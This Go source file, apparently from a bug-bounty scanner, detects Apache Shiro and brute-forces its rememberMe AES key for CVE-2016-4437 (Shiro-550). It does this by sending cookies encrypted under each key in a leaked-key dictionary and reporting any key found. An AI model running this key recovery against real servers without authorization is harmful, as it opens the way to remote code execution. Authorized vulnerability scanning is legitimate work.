package bugbounty

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"net/http"
	"strings"
)

// ============================================================
// Shiro common: AES-CBC encryption + SimplePrincipalCollection
// ============================================================

// shiroCheckObj: SimplePrincipalCollection serialized bytes (always deserializable by Shiro)
var shiroCheckObj, _ = base64.StdEncoding.DecodeString(
	"rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==")

func shiroEncrypt(key []byte, data []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		return ""
	}
	iv := make([]byte, 16)
	rand.Read(iv)
	pad := 16 - len(data)%16
	padded := append(data, bytes.Repeat([]byte{byte(pad)}, pad)...)
	cbc := cipher.NewCBCEncrypter(block, iv)
	ct := make([]byte, len(padded))
	cbc.CryptBlocks(ct, padded)
	return base64.StdEncoding.EncodeToString(append(iv, ct...))
}

func shiroHasDeleteMe(resp *http.Response) bool {
	for _, c := range resp.Cookies() {
		if c.Name == "rememberMe" && strings.Contains(c.Value, "deleteMe") {
			return true
		}
	}
	return false
}

// ============================================================
// CVE-2016-4437 Shiro-550 - rememberMe key brute-force
// Uses 1110 known leaked/default AES keys from goPocs dictionary
// ============================================================
func ProbeShiro(base string) *Finding {
	// Step 1: check if Shiro exists (deleteMe on invalid cookie)
	req, _ := http.NewRequest("GET", base+"/", nil)
	req.Header.Set("Cookie", "rememberMe=1")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	if !shiroHasDeleteMe(resp) {
		return nil // Not Shiro
	}

	// Step 2: brute-force all known keys with SimplePrincipalCollection
	for _, kb := range shiroKeyDict {
		key, err := base64.StdEncoding.DecodeString(kb)
		if err != nil || len(key) != 16 {
			continue
		}
		cookie := shiroEncrypt(key, shiroCheckObj)
		if cookie == "" {
			continue
		}
		req, _ := http.NewRequest("GET", base+"/", nil)
		req.Header.Set("Cookie", "rememberMe="+cookie)
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if !shiroHasDeleteMe(resp) {
			// Key found! No deleteMe = correct AES key
			return &Finding{Target: base, Vuln: "CVE-2016-4437 Shiro-550", Severity: "CRITICAL",
				Detail: "Shiro key found: " + kb + " (AES-CBC, RCE possible)", URL: base}
		}
	}
	return &Finding{Target: base, Vuln: "CVE-2016-4437 Shiro-550 (detected, key not in dict)", Severity: "HIGH",
		Detail: "rememberMe=deleteMe present but key not in known dictionary (1110 keys)", URL: base}
}
